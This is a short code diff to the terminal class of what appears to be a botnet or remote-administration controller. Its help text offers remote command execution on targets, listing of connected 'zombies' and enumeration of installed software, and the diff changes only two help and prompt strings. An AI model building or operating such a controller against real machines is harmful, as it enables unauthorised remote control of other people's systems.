@@ -42,7 +42,7 @@ class Terminal:
 !clear                  ---> clear terminal
 !exec "COMMAND"         ---> execute command
 Example: !exec "ls" -h "192.168.1.100:49700"
-Select Target           ---> -h "TARGET"
+Select Target           ---> -h "TARGET" -h "TARGET2"
 !set target TARGET      ---> set default target
 !get-zombies            ---> get connected zombies
 !software               ---> get target installed software
@@ -159,7 +159,7 @@ Select Target           ---> -h "TARGET"
             if self.default_target:
                 return [self.default_target]
             else:
-                self.push_text_in_terminal_box('select target --> -h TARGET')
+                self.push_text_in_terminal_box('select target --> -h "TARGET"')
                 return None
 
     def get_communicator(self ,target):
